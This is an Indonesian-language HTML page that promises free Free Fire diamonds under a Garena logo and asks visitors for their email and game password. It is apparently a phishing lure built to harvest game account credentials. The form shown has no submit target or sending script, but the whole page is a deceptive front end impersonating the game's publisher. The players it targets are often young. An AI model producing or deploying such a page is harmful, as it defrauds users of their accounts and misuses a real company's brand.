<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Diamond Free Fire Gratis</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/aos@2.3.4/dist/aos.css" rel="stylesheet">
    <style>
        body {
            background-image: url('bg.png');
            background-size: cover;
            background-position: center;
        }
    </style>
</head>
<body class="bg-red-900 text-white">
    <header class="bg-red-800 text-white p-6 text-center">
        <h1 class="text-4xl font-bold leading-tight mb-4">Dapatkan Diamond Free Fire <span class="text-yellow-400">Gratis</span> Sekarang!</h1>
        <p class="text-lg">Kami memberikan diamond Free Fire secara cuma-cuma. Segera klaim sebelum kehabisan!</p>
    </header>

    <main class="flex flex-col items-center justify-center min-h-screen p-4">
        <div data-aos="fade-up" class="mb-6">
            <img src="gr.png" alt="Logo Garena" class="w-40 mx-auto mb-4">
        </div>

        <form data-aos="fade-up" data-aos-delay="200" class="bg-gray-900 p-8 rounded-lg shadow-lg w-full max-w-md">
            <h2 class="text-2xl font-semibold mb-6">Isi Data Kamu di Bawah Ini</h2>
            <div class="mb-4">
                <label for="email" class="block text-gray-300 text-sm">Email</label>
                <input type="email" id="email" name="email" class="w-full p-3 border border-gray-600 rounded-md bg-gray-800 text-white focus:outline-none focus:ring-2 focus:ring-red-500" required>
            </div>
            <div class="mb-6">
                <label for="password" class="block text-gray-300 text-sm">Password Game</label>
                <input type="password" id="password" name="password" class="w-full p-3 border border-gray-600 rounded-md bg-gray-800 text-white focus:outline-none focus:ring-2 focus:ring-red-500" required>
            </div>
            <button type="submit" class="w-full bg-red-600 text-white p-3 rounded-md text-lg font-semibold hover:bg-red-700 transition duration-300">Klaim Diamond Gratis</button>
        </form>
    </main>

    <footer class="bg-red-800 text-white p-4 text-center">
        <p>&copy; 2024 Diamond Free Fire. Semua hak cipta dilindungi.</p>
    </footer>

    <script src="https://cdn.jsdelivr.net/npm/aos@2.3.4/dist/aos.js"></script>
    <script>
        AOS.init();
    </script>
</body>
</html>
